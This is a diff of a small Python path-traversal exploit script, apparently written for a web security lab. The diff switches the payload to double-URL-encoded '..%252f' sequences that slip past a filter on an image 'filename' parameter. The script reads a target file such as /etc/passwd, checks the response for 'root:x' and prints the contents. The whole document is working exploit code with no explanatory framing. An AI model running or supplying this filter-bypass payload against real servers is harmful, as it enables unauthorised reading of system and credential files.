@@ -1,16 +1,16 @@
 import requests
-import urllib3
 import sys
+import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies={"http":"http://127.0.0.1:8081","https":"http://127.0.0.1:8081"}
 
 def path_transversal_exploit(url,target_file):
-    path=f"/image?filename=....//....//....//{target_file}"
+    path=f"/image?filename=..%252f..%252f..%252f{target_file}"
     r=requests.get(url+path,verify=False,proxies=proxies)
     if "root:x" in r.text:
-        print("[+] Exploit Sucessfull.")
+        print("[+] Exploit Successfull.")
         print(f"[+] The contents of {target_file} is printed.")
         print(r.text)
         sys.exit(0)
@@ -20,7 +20,7 @@ def path_transversal_exploit(url,target_file):
 
 def main():
     if len(sys.argv)!=3:
-        print("[+] Usage: %s <url> {target_file}" % sys.argv[0])
+        print("[+] Usage: %s <url> <target_file>" % sys.argv[0])
         print("[+] Example: %s http://evil.com /etc/passwd" % sys.argv[0])
         sys.exit(-1)
     else:
